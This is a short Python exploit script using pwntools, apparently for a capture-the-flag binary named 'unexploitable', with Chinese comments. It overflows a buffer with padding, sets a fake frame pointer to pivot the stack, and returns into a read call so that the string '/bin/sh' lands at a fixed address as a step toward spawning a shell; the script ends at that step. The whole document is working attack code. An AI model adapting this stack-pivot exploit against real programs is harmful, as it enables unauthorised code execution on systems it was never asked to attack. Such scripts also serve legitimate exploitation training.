#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x400560
set_read_addr = 0x40055b
read_addr = 0x400571
fake_stack_addr = 0x60116c
fake_ebp_addr = 0x60116c
binsh_addr = 0x60115c

io = process("./unexploitable")

payload = ""
payload += 'a'*16               #padding
payload += p64(fake_stack_addr) #两次leave造成的stack pivot，第一次使rbp变为0x60116c, rbp+buf为0x60115c
payload += p64(set_read_addr)   #lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read
io.send(payload)
io.sendline("/bin/sh\x00")
#这样可以将binsh字符串读取到0x60115c处